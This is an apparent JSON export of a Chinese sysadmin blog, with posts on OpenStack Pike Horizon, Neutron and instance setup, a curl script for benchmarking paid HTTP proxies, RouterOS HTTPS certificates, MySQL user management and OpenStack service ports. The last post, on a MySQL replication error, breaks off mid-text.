123把Default设置为默认域OPENSTACK_KEYSTONE_DEFAULT_DOMAIN &#x3D; &quot;Default&quot; 123指定通过dashboard创建用户的默认角色OPENSTACK_KEYSTONE_DEFAULT_ROLE &#x3D; &quot;user&quot; 123456789101112如果使用了扁平桥接网络, 需要禁用对三层网络服务的支持(否则dashboard会报错)OPENSTACK_NEUTRON_NETWORK &#x3D; &#123; &#39;enable_router&#39;: False, &#39;enable_quotas&#39;: False, &#39;enable_distributed_router&#39;: False, &#39;enable_ha_router&#39;: False, &#39;enable_lb&#39;: False, &#39;enable_firewall&#39;: False, &#39;enable_vpn&#39;: False, &#39;enable_fip_topology_check&#39;: False,&#125; 123配置时区TIME_ZONE &#x3D; &quot;Asia&#x2F;Shanghai&quot; 重启服务 123systemctl restart httpd.service上面虽修改了 Web访问 123456我把Horizon配置在了192.168.56.12机器上，所以我应该访问它的地址http:&#x2F;&#x2F;192.168.56.12&#x2F;dashboard&#x2F;域：Default账号: admin 密码:admin账号: demo 密码：demo 故障处理 CentOS7.4 重启完Apache访问Horizon出错，错误:500 12345678解决方法：vim &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;openstack-dashboard.conf搜索：WSGISocketPrefix run&#x2F;wsgi在下面加入如下一行：WSGIApplicationGroup %&#123;GLOBAL&#125;最后重启Apachesystemctl restart httpd","categories":[],"tags":[{"name":"Horizon","slug":"Horizon","permalink":"https://garywu520.github.io/tags/Horizon/"},{"name":"Dashboard","slug":"Dashboard","permalink":"https://garywu520.github.io/tags/Dashboard/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"}]},{"title":"OpenStack-Pike-创建第1台云主机9","slug":"OpenStack-Pike-创建第1台云主机9","date":"2018-01-10T06:23:47.000Z","updated":"2018-01-14T04:56:45.553Z","comments":true,"path":"2018/01/10/OpenStack-Pike-创建第1台云主机9/","link":"","permalink":"https://garywu520.github.io/2018/01/10/OpenStack-Pike-%E5%88%9B%E5%BB%BA%E7%AC%AC1%E5%8F%B0%E4%BA%91%E4%B8%BB%E6%9C%BA9/","excerpt":"####创建Provider Network网络 1使用提供者（外部）网络，提供者网络通过L2（桥&#x2F;交换机）设备连接到物理网络。这个网络包括为云主机提供IP地址的DHCP服务器。","text":"####创建Provider Network网络 1使用提供者（外部）网络，提供者网络通过L2（桥&#x2F;交换机）设备连接到物理网络。这个网络包括为云主机提供IP地址的DHCP服务器。 注：如果选择“提供者网络”则只需创建一个公有网络。但如果选择“自服务网络”，需要同时创建一个公有网络和一个私有网络！切记！ 创建Provider Networks 确保配置了以下参数 12345678910vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;ml2_conf.ini[ml2_type_flat] flat_networks &#x3D; provider------------------------------------------------vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;linuxbridge_agent.ini[linux_bridge] physical_interface_mappings &#x3D; provider：eth0注：生产环境服务器有多个网卡，所以“提供者（外部）网络可能会配置在eth1网卡”。 1source &#x2F;scripts&#x2F;admin_openrc 创建公共网络 12345openstack network create --share --external --provider-physical-network provider --provider-network-type flat provider参数释义：--share 参数选项允许所有项目使用虚拟网络--external选项将虚拟网络定义为外部 在公共网络上创建一个子网(注意:需要与现有机器同一网段,并确保DHCP不冲突) 12345678910openstack subnet create --network provider \\ --allocation-pool start&#x3D;192.168.56.50,end&#x3D;192.168.56.100 \\ --dns-nameserver 8.8.8.8 --gateway 192.168.56.2 \\ --subnet-range 192.168.56.0&#x2F;24 provider 参数：--allocation-pool 指定一个地址池--dns-nameserver 指定一个DNS--gateway 指定网关--subnet-range 指定网络地址 创建一个主机规格,名称为mini.nano 1openstack flavor create --id 0 --vcpus 2 --ram 768 --disk 5 mini.nano 注：使用Demo进行以下操作，这样生成的虚拟机都在Demo项目下 生成一个key来实现无密码登陆虚拟云主机(可选) 1234567source &#x2F;scripts&#x2F;demo-openrc生成一个key或使用现有的keyssh-keygen -q -N &quot;&quot;添加key的公钥到计算服务中,并定义名称为mykeyopenstack keypair create --public-key ~&#x2F;.ssh&#x2F;id_rsa.pub mykey 验证公钥 123456openstack keypair list+-------+-------------------------------------------------+| Name | Fingerprint |+-------+-------------------------------------------------+| mykey | 85:0f:61:f5:f8:ec:7b:86:7e:7a:c0:10:78:f8:01:29 |+-------+-------------------------------------------------+ 增加安全组规则 12345开启icmp pingopenstack security group rule create --proto icmp default允许ssh访问openstack security group rule create --proto tcp --dst-port 22 default 启动一个虚拟机 列出可用云主机类型 1openstack flavor list 列出可用镜像 123456openstack image list+--------------------------------------+--------+--------+| ID | Name | Status |+--------------------------------------+--------+--------+| 3e41628d-4dc9-4f73-8517-50dbc60ba5b4 | cirros | active |+--------------------------------------+--------+--------+ 列出可用网络 123456openstack network list+--------------------------------------+----------+--------------------------------------+| ID | Name | Subnets |+--------------------------------------+----------+--------------------------------------+| 605a77b4-d232-4d0b-b915-d6572542c3d5 | provider | 925bb8f3-0e13-40d3-aa12-3c5e25d81238 |+--------------------------------------+----------+--------------------------------------+ 创建虚拟机1234567openstack server create --flavor mini.nano --image cirros \\ --nic net-id&#x3D;605a77b4-d232-4d0b-b915-d6572542c3d5 \\ --security-group default \\ --key-name mykey First1Host 指定网络ID：--nic net-id&#x3D;PROVIDER_NET_ID （使用provider公有网络的ID替换PROVIDER_NET_ID）指定虚拟机的云主机规格mini.nano、image镜像:cirros、网络ID号、安全组和导入的免密公钥名称，最后命名这台云主机名称为First1Host 123456789查看云主机状态[root@controller ~]# openstack server list+--------------------------------------+------------+--------+----------------------+--------+-----------+| ID | Name | Status | Networks | Image | Flavor |+--------------------------------------+------------+--------+----------------------+--------+-----------+| 6d3d639b-18a1-4bc2-8a71-6f4b4a95b444 | First1Host | ACTIVE | provider&#x3D;172.16.1.13 | cirros | mini.nano |+--------------------------------------+------------+--------+----------------------+--------+-----------+当构建过程完全成功后，状态会从 BUILD&#96;&#96;变为&#96;&#96;ACTIVE 此时计算节点ifconfig命令结果如下： 123456789[root@compute ~]# ifconfigbrq605a77b4-d2: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.56.12 netmask 255.255.255.0 broadcast 192.168.56.255eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::20c:29ff:feca:1571 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:ca:15:71 txqueuelen 1000 (Ethernet) 出现此结果说明创建云主机正常。 使用虚拟控制台访问虚拟机 1234获取云主机First1Host的VNC虚拟控制台地址openstack console url show First1Host将结果在浏览器中打开即可，账户:cirros 密码：cubswin:) 在云主机中验证 验证能否ping通公共网络的网关 1$ ping -c 4 192.168.56.2 验证能否上网 1$ ping -c 4 qq.com 验证云主机远程访问 1ping -c 4 192.168.56.53 SSH访问 1ssh cirros@192.168.56.53 故障总结 1虚拟机运行故障取决于两大组件，即neutron和nova,出了问题优先查这两个日志 云主机软重启 12openstack server listopenstack server reboot SERVER #软重启","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"创建云主机","slug":"创建云主机","permalink":"https://garywu520.github.io/tags/%E5%88%9B%E5%BB%BA%E4%BA%91%E4%B8%BB%E6%9C%BA/"}]},{"title":"批量测试HTTP代理成功率脚本","slug":"批量测试HTTP代理成功率脚本","date":"2018-01-10T03:35:49.000Z","updated":"2018-01-10T03:54:05.465Z","comments":true,"path":"2018/01/10/批量测试HTTP代理成功率脚本/","link":"","permalink":"https://garywu520.github.io/2018/01/10/%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95HTTP%E4%BB%A3%E7%90%86%E6%88%90%E5%8A%9F%E7%8E%87%E8%84%9A%E6%9C%AC/","excerpt":"12业务需求：计划采购付费HTTP代理，需对各服务商产品进行成功率压测。憋了半天，弄出来了一个简单脚本，基本实现了需求。","text":"12业务需求：计划采购付费HTTP代理，需对各服务商产品进行成功率压测。憋了半天，弄出来了一个简单脚本，基本实现了需求。 1234567891011目录结构：[root@localhost ~]# tree testtest├── dly.sh├── dly.txt├── xun.sh├── xun.txt├── zhima.sh└── zhima.txt每个sh脚本是一家服务商，内容基本一致 脚本内容: 12345678#!&#x2F;bin&#x2F;shwhile read ido curl -A &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.0)&quot; -o &#x2F;dev&#x2F;null -s -w &quot;返回值:%&#123;http_code&#125;:TCP连接时间:%&#123;time_connect&#125;:Web服务器返回时间:%&#123;time_starttransfer&#125;:请求完成时间:%&#123;time_total&#125;\\n&quot; -x $i --proxy-user garywu:123456 http:&#x2F;&#x2F;www.aliyun.com sleep 5done &lt; .&#x2F;dly.txt 脚本说明： 12345678910- 首先从各服务商获取代理IP和端口列表，并存入txt文档- 其次使用while循环逐个将txt文档内每行的IP和端口读入并赋予变量i- 使用curl命令来请求测试： -A 参数来指定所使用的浏览器版本 -o 请求结果输出到空 -s和-w来定义命令行中线上的HTTP返回值 -x 使用代理(格式为 ip:port) --proxy-user 指定代理所使用的用户名和密码（格式为 user:password） 最后输入要请求的域名 每次while循环延迟5秒执行 脚本运行结果 只要返回200说明代理是OK的，如果返回值为000则说明HTTP代理不可用 12345678910返回值:200:TCP连接时间:0.025:Web服务器返回时间:0.157:请求完成时间:1.311返回值:200:TCP连接时间:0.055:Web服务器返回时间:0.244:请求完成时间:21.989返回值:200:TCP连接时间:0.585:Web服务器返回时间:2.891:请求完成时间:19.911返回值:200:TCP连接时间:0.021:Web服务器返回时间:0.157:请求完成时间:1.351返回值:000:TCP连接时间:0.000:Web服务器返回时间:0.000:请求完成时间:127.141返回值:200:TCP连接时间:0.047:Web服务器返回时间:0.168:请求完成时间:1.844返回值:200:TCP连接时间:0.029:Web服务器返回时间:0.137:请求完成时间:9.808返回值:200:TCP连接时间:0.032:Web服务器返回时间:0.108:请求完成时间:1.883返回值:000:TCP连接时间:0.000:Web服务器返回时间:0.000:请求完成时间:0.001返回值:200:TCP连接时间:0.370:Web服务器返回时间:1.977:请求完成时间:10.395 计算可用率百分比 12345为啥脚本中没有直接去计算百分比？因为代理是有实效性的，当你拿到代理IP的时候，5-10分钟就会失效。所以代理测试列表建议生成20个代理IP即可，这样在5-10分钟内基本可以测试完毕。但如果生成的代理IP过多，5-10分钟失效后，你的脚本仍在测试中，这时候你会发现下面会出现很多返回值是000的情况","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HTTP代理","slug":"HTTP代理","permalink":"https://garywu520.github.io/tags/HTTP%E4%BB%A3%E7%90%86/"},{"name":"Shell脚本","slug":"Shell脚本","permalink":"https://garywu520.github.io/tags/Shell%E8%84%9A%E6%9C%AC/"}]},{"title":"OpenStack-Pike-Neutron网络服务-计算节点8","slug":"OpenStack-Pike-Neutron网络服务-计算节点8","date":"2018-01-09T13:27:59.000Z","updated":"2018-01-12T12:02:38.903Z","comments":true,"path":"2018/01/09/OpenStack-Pike-Neutron网络服务-计算节点8/","link":"","permalink":"https://garywu520.github.io/2018/01/09/OpenStack-Pike-Neutron%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1-%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B98/","excerpt":"计算节点配置","text":"计算节点配置 计算节点安装 1yum install -y openstack-neutron-linuxbridge ebtables ipset 配置neutron 1vim &#x2F;etc&#x2F;neutron&#x2F;neutron.conf 1234配置RabbitMQ[DEFAULT]transport_url &#x3D; rabbit:&#x2F;&#x2F;openstack:openstack@192.168.56.11 #配置文件553行 123456789101112131415配置keystone[DEFAULT]auth_strategy &#x3D; keystone[keystone_authtoken]auth_uri &#x3D; http:&#x2F;&#x2F;192.168.56.11:5000auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357memcached_servers &#x3D; 192.168.56.11:11211auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultproject_name &#x3D; serviceusername &#x3D; neutronpassword &#x3D; neutron 1234配置锁路径[oslo_concurrency]lock_path &#x3D; &#x2F;var&#x2F;lib&#x2F;neutron&#x2F;tmp 配置Linux bridge agent 1vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;linuxbridge_agent.ini 配置网卡桥接 12[linux_bridge]physical_interface_mappings &#x3D; provider:eth0 #如果本地网卡是eth1此处需要对应修改 启用vxlan 12[vxlan]enable_vxlan &#x3D; false 启用安全组并配置Linux网桥iptables防火墙驱动程序 123[securitygroup]enable_security_group &#x3D; truefirewall_driver &#x3D; neutron.agent.linux.iptables_firewall.IptablesFirewallDriver 配置nova文件的neutron 1vim &#x2F;etc&#x2F;nova&#x2F;nova.conf 12345678910[neutron]url &#x3D; http:&#x2F;&#x2F;192.168.56.11:9696auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultregion_name &#x3D; RegionOneproject_name &#x3D; serviceusername &#x3D; neutronpassword &#x3D; neutron 验证安装 重启nova服务 1systemctl restart openstack-nova-compute.service 启动桥接并开机启动 12systemctl enable neutron-linuxbridge-agent.servicesystemctl start neutron-linuxbridge-agent.service 控制节点验证neutron安装 1source &#x2F;scripts&#x2F;admin_openrc 12345678910[root@controler neutron]# neutron agent-listneutron CLI is deprecated and will be removed in the future. Use openstack CLI instead.+--------------------------------------+--------------------+-------------------------+-------------------+-------+----------------+---------------------------+| id | agent_type | host | availability_zone | alive | admin_state_up | binary |+--------------------------------------+--------------------+-------------------------+-------------------+-------+----------------+---------------------------+| 01f5abf6-3243-4588-9eca-44ffd7320853 | Metadata agent | controler.openstack.com | | :-) | True | neutron-metadata-agent || af6c5905-ed60-4b1e-8bcc-f5887e4a495a | Linux bridge agent | computer.openstack.com | | :-) | True | neutron-linuxbridge-agent || be841bd6-18ea-4d46-b22a-f72faec504a1 | Linux bridge agent | controler.openstack.com | | :-) | True | neutron-linuxbridge-agent || f27340ef-bf39-4e08-84e0-e63844437635 | DHCP agent | controler.openstack.com | nova | :-) | True | neutron-dhcp-agent |+--------------------------------------+--------------------+-------------------------+-------------------+-------+----------------+---------------------------+ 注：如果上面的结果是false，则有可能控制节点与计算节点时间同步出现了问题，手动同步即可。最好在最初就创建好NTP服务器","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"neutron","slug":"neutron","permalink":"https://garywu520.github.io/tags/neutron/"}]},{"title":"OpenStack-Pike-Neutron网络服务-控制节点7","slug":"OpenStack-Pike-Neutron网络服务-控制节点7","date":"2018-01-09T11:47:35.000Z","updated":"2018-01-12T10:34:53.821Z","comments":true,"path":"2018/01/09/OpenStack-Pike-Neutron网络服务-控制节点7/","link":"","permalink":"https://garywu520.github.io/2018/01/09/OpenStack-Pike-Neutron%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1-%E6%8E%A7%E5%88%B6%E8%8A%82%E7%82%B97/","excerpt":"Neutron网络服务 1在Neutron的世界里，网络、子网、端口和路由器与物理网络、子网、端口的概念和功能一样。","text":"Neutron网络服务 1在Neutron的世界里，网络、子网、端口和路由器与物理网络、子网、端口的概念和功能一样。 配置neutron数据库 123create database neutron;grant all privileges on neutron.* to &#39;neutron&#39;@&#39;%&#39; identified by &#39;neutron&#39;;grant all privileges on neutron.* to &#39;neutron&#39;@&#39;localhost&#39; identified by &#39;neutron&#39;; Neutron控制节点配置 创建Neutron用户 1source &#x2F;scripts&#x2F;admin_openrc 添加neutron用户 1openstack user create --domain default --password-prompt neutron 将neutron用户同时加入到admin角色和service项目中 1openstack role add --project service --user neutron admin 创建neutron服务 1openstack service create --name neutron --description &quot;OpenStack Networking&quot; network 创建网络服务API endpoint 123openstack endpoint create --region RegionOne network public http:&#x2F;&#x2F;192.168.56.11:9696openstack endpoint create --region RegionOne network internal http:&#x2F;&#x2F;192.168.56.11:9696openstack endpoint create --region RegionOne network admin http:&#x2F;&#x2F;192.168.56.11:9696 Neutron两种网络方式 123Neutron提供两种网络方式： 1. 提供者网络 Provider networks2. 自服务网络 Self-service networks 注：以下使用Provider networks(桥接)来配置neutron 控制节点安装 1yum install openstack-neutron openstack-neutron-ml2 openstack-neutron-linuxbridge ebtables 配置 1vim &#x2F;etc&#x2F;neutron&#x2F;neutron.conf 123配置数据库[database]connection &#x3D; mysql+pymysql:&#x2F;&#x2F;neutron:neutron@192.168.56.11&#x2F;neutron 123456启用二层网络模块 Modular Layer2 (ML2)插件注：此处的Layer2即理解为二层(数据链路层)网络[DEFAULT]core_plugin &#x3D; ml2service_plugins &#x3D; #值置为空 1234配置RabbitMQ(填写Rabbitmq集群主节点IP)[DEFAULT]transport_url &#x3D; rabbit:&#x2F;&#x2F;openstack:openstack@192.168.56.11 #配置文件553行 123456789101112131415keystone认证配置[DEFAULT]auth_strategy &#x3D; keystone[keystone_authtoken]auth_uri &#x3D; http:&#x2F;&#x2F;192.168.56.11:5000auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357memcached_servers &#x3D; 192.168.56.11:11211auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultproject_name &#x3D; serviceusername &#x3D; neutronpassword &#x3D; neutron 123456789101112131415配置nova[DEFAULT]notify_nova_on_port_status_changes &#x3D; truenotify_nova_on_port_data_changes &#x3D; true #参数含义：当网络拓扑有变化时，来通知nova[nova]auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultregion_name &#x3D; RegionOneproject_name &#x3D; serviceusername &#x3D; novapassword &#x3D; nova 1234配置锁路径[oslo_concurrency]lock_path &#x3D; &#x2F;var&#x2F;lib&#x2F;neutron&#x2F;tmp 配置Modular Layer 2 (ML2)插件 1vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;ml2_conf.ini 12345678910111213启用flat和vlan网络[ml2]type_drivers &#x3D; flat,vlan关闭自服务网络self-servicetenant_network_types &#x3D; #置为空启用桥接mechanism_drivers &#x3D; linuxbridge启用端口安全扩展驱动程序extension_drivers &#x3D; port_security 1234将提供者虚拟网络配置为扁平网络[ml2_type_flat]flat_networks &#x3D; provider 1234使用ipset来提高安全组规则的效率[securitygroup]enable_ipset &#x3D; true 配置Linux bridge agent 1vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;linuxbridge_agent.ini 1234将提供者虚拟网络映射到提供者物理网络接口[linux_bridge]physical_interface_mappings &#x3D; provider:eth0 #如果你的物理网卡非eth0，这里需要对应修改 1234关闭VXLAN网络[vxlan]enable_vxlan &#x3D; false 12345启用安全组并配置Linux网桥iptables防火墙驱动程序[securitygroup]enable_security_group &#x3D; truefirewall_driver &#x3D; neutron.agent.linux.iptables_firewall.IptablesFirewallDriver 配置DHCP agent( 此项不配置，与现有网络DHCP冲突) 1vim &#x2F;etc&#x2F;neutron&#x2F;dhcp_agent.ini 123456配置Linux网桥接口驱动程序，Dnsmasq DHCP驱动程序，并启用隔离的元数据，以便提供商网络上的实例可以通过网络访问元数据[DEFAULT]interface_driver &#x3D; linuxbridgedhcp_driver &#x3D; neutron.agent.linux.dhcp.Dnsmasq enable_isolated_metadata &#x3D; true 配置metadata agent 1vim &#x2F;etc&#x2F;neutron&#x2F;metadata_agent.ini 12345配置元数据主机和共享密钥[DEFAULT]nova_metadata_host &#x3D; 192.168.56.11metadata_proxy_shared_secret &#x3D; openstack #共享密钥配置为openstack 配置nova文件的neutron配置 1vim &#x2F;etc&#x2F;nova&#x2F;nova.conf 123456789101112[neutron]url &#x3D; http:&#x2F;&#x2F;192.168.56.11:9696auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultregion_name &#x3D; RegionOneproject_name &#x3D; serviceusername &#x3D; neutronpassword &#x3D; neutronservice_metadata_proxy &#x3D; truemetadata_proxy_shared_secret &#x3D; openstack #此处输入刚才的openstack共享密钥 控制节点完成配置 ML2插件配置文件软链 1ln -s &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;ml2_conf.ini &#x2F;etc&#x2F;neutron&#x2F;plugin.ini 同步数据库 1su -s &#x2F;bin&#x2F;sh -c &quot;neutron-db-manage --config-file &#x2F;etc&#x2F;neutron&#x2F;neutron.conf --config-file &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;ml2_conf.ini upgrade head&quot; neutron 重启nova-api服务 1systemctl restart openstack-nova-api.service 开机启动 1234567systemctl enable neutron-server.service \\neutron-linuxbridge-agent.service neutron-dhcp-agent.service \\neutron-metadata-agent.servicesystemctl start neutron-server.service \\neutron-linuxbridge-agent.service neutron-dhcp-agent.service \\neutron-metadata-agent.service Nutron日志排错 查看端口 1ss -lntup |grep 9696 查看错误日志 1234567grep &quot;ERROR&quot; &#x2F;var&#x2F;log&#x2F;neutron&#x2F;*log注：如果此时刚启动neutron日志就报ERROR，很可能是时间未同步导致。 解决方法： 1. 清空源neutron错误日志 2. 控制节点和计算节点同步时间 3.重启neutron","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"Neutron","slug":"Neutron","permalink":"https://garywu520.github.io/tags/Neutron/"}]},{"title":"RouterOS启用HTTPS访问","slug":"RouterOS启用HTTPS访问","date":"2018-01-09T07:41:20.000Z","updated":"2018-08-09T08:16:45.278Z","comments":true,"path":"2018/01/09/RouterOS启用HTTPS访问/","link":"","permalink":"https://garywu520.github.io/2018/01/09/RouterOS%E5%90%AF%E7%94%A8HTTPS%E8%AE%BF%E9%97%AE/","excerpt":"1RouterOS的webfig页面通常都是基于http协议的，用户通过webfig进行登录的时候，登录密码在网络上明文传输，存在被肉鸡的风险。为了解决上述问题可以改用https协议承载webfig服务，但https协议需要ssl证书，因此需要在linux上生成ssl证书。","text":"1RouterOS的webfig页面通常都是基于http协议的，用户通过webfig进行登录的时候，登录密码在网络上明文传输，存在被肉鸡的风险。为了解决上述问题可以改用https协议承载webfig服务，但https协议需要ssl证书，因此需要在linux上生成ssl证书。 linux生成ssl证书12345678910(1)创建跟证书密钥文件：root.key，这一步需要输入密码 openssl genrsa -des3 -out root.key 4096(2)创建根证书的申请文件：root.csr openssl req -new -key root.key -out root.csr(3)创建根证书：root.crt openssl x509 -req -days 3650 -sha1 -extensions v3_ca -signkey root.key -in root.csr -out root.crt注：-days选项为根证书有效期 12345678910(4)创建服务器证书密钥：server.key openssl genrsa -out server.key 4096 (5)创建服务器证书申请文件：server.csr openssl req -new -key server.key -out server.csr(6)创建服务证书：server.crtopenssl x509 -req -days 3650 -sha1 -extensions v3_req -CA root.crt -CAkey root.key -CAcreateserial -in server.csr -out server.crt注: -days选项为证书有效期 至此，证书创建完毕 上传证书到RouterOS1将生成的server.key与server.crt上传之RouterOS的Files中 导入证书12在system--&gt;certificates--&gt;certificates--&gt;import中首先导入server.crt，其次导入server.key, 证书状态变成KT即可 启用www-ssl服务1在ip--&gt;services中配置www-ssl服务，并选择刚刚导入的server.crt作为证书即可。 测试访问 1https:&#x2F;&#x2F;routeros_gateway_ip","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://garywu520.github.io/tags/HTTPS/"},{"name":"RouterOS","slug":"RouterOS","permalink":"https://garywu520.github.io/tags/RouterOS/"},{"name":"ROS","slug":"ROS","permalink":"https://garywu520.github.io/tags/ROS/"}]},{"title":"MySQL数据库用户与权限管理3","slug":"MySQL数据库用户与权限管理3","date":"2018-01-08T09:57:40.000Z","updated":"2018-01-08T09:59:49.930Z","comments":true,"path":"2018/01/08/MySQL数据库用户与权限管理3/","link":"","permalink":"https://garywu520.github.io/2018/01/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%863/","excerpt":"1MySQL基本管理命令, 用户管理+权限管理+数据库管理","text":"1MySQL基本管理命令, 用户管理+权限管理+数据库管理 用户管理 概念 1234567用户: 用于管理数据库及数据权限：对数据库的读写等操作角色：是指对数据库定义好的一组权限权限范围： 全库级别: *.* 单库级别： one.* 单表级别: one.t1 查看mysql用户的账户密码及权限 1select user,host,password from mysql.user; 创建用户 1234567create user &#39;用户名&#39;@&#39;主机&#39; identified by &#39;密码&#39;;主机处可以指定权限：localhost 是指只有本地连接权限172.16.1.% 是指本网段具有连接权限例:创建一个名为test用户，172.16.1.0网段均可连接此数据库 create user &#39;test&#39;@&#39;172.16.1.%&#39; identified by &#39;123456&#39;; 12查看所有mysql用户及对应的权限select user,host,password from mysql.user; 给用户授权 123grant all on test.* to test@&#39;172.16.1.%&#39;;注：当同一个用户被授予了多个权限，以最大的权限设置为准。 创建用户并给用户授权 1grant all on test.* to test@&#39;172.16.1.%&#39; identified by &#39;123456&#39;; 刷新权限 1flush privileges; 回收权限 12345show grants for test@&#39;172.16.1.%&#39;; #先查看用户权限格式:revoke 权限 数据库范围 from 用户revoke delete on test.* from test@&#39;172.16.1.%&#39;; 查看当前是以哪个用户登录的数据库 1select user(); 删除用户 123格式:drop user &#39;用户&#39;@&#39;主机域&#39;drop user &#39;test&#39;@&#39;172.16.1.%&#39;; 数据库管理 查看当前数据库 1show databases; 创建数据库 1create database test; 删除数据库 1drop database test;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"数据库管理","slug":"数据库管理","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86/"},{"name":"用户管理","slug":"用户管理","permalink":"https://garywu520.github.io/tags/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"}]},{"title":"OpenStack各服务端口号汇总","slug":"OpenStack各服务端口号汇总","date":"2018-01-07T07:07:56.000Z","updated":"2018-01-07T07:14:25.660Z","comments":true,"path":"2018/01/07/OpenStack各服务端口号汇总/","link":"","permalink":"https://garywu520.github.io/2018/01/07/OpenStack%E5%90%84%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%B1%87%E6%80%BB/","excerpt":"参考:官方","text":"参考:官方 OpenStack service Default ports Port type Application Catalog (murano) 8082 Block Storage (cinder) 8776 publicurl and adminurl Compute (nova) endpoints 8774 publicurl and adminurl Compute API (nova-api) 8773, 8775 Compute ports for access to virtual machine consoles 5900-5999 Compute VNC proxy for browsers ( openstack-nova-novncproxy) 6080 Compute VNC proxy for traditional VNC clients (openstack-nova-xvpvncproxy) 6081 Proxy port for HTML5 console used by Compute service 6082 Data processing service (sahara) endpoint 8386 publicurl and adminurl Identity service (keystone) administrative endpoint 35357 adminurl Identity service public endpoint 5000 publicurl Image service (glance) API 9292 publicurl and adminurl Image service registry 9191 Networking (neutron) 9696 publicurl and adminurl Object Storage (swift) 6000, 6001, 6002 Orchestration (heat) endpoint 8004 publicurl and adminurl Orchestration AWS CloudFormation-compatible API (openstack-heat-api-cfn) 8000 Orchestration AWS CloudWatch-compatible API (openstack-heat-api-cloudwatch) 8003 Telemetry (ceilometer) 8777 publicurl and adminurl","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"服务端口号汇总","slug":"服务端口号汇总","permalink":"https://garywu520.github.io/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E5%8F%B7%E6%B1%87%E6%80%BB/"}]},{"title":"Mysql主从库同步错误：1062 Error 'Duplicate entry '1438019'","slug":"Mysql主从库同步错误：1062-Error-Duplicate-entry-1438019","date":"2018-01-05T20:44:39.000Z","updated":"2018-01-05T20:56:33.430Z","comments":true,"path":"2018/01/06/Mysql主从库同步错误：1062-Error-Duplicate-entry-1438019/","link":"","permalink":"https://garywu520.github.io/2018/01/06/Mysql%E4%B8%BB%E4%BB%8E%E5%BA%93%E5%90%8C%E6%AD%A5%E9%94%99%E8%AF%AF%EF%BC%9A1062-Error-Duplicate-entry-1438019/","excerpt":"1mysql主从库在同步时会发生1062 Last_SQL_Error: Error ‘Duplicate entry ‘的问题,显然这个问题是因为插入重复主键导致从库不工作了。","text":"1mysql主从库在同步时会发生1062 Last_SQL_Error: Error ‘Duplicate entry ‘的问题,显然这个问题是因为插入重复主键导致从库不工作了。 查看从库状态 123456789101112131415161718192021222324错误消息如下 mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 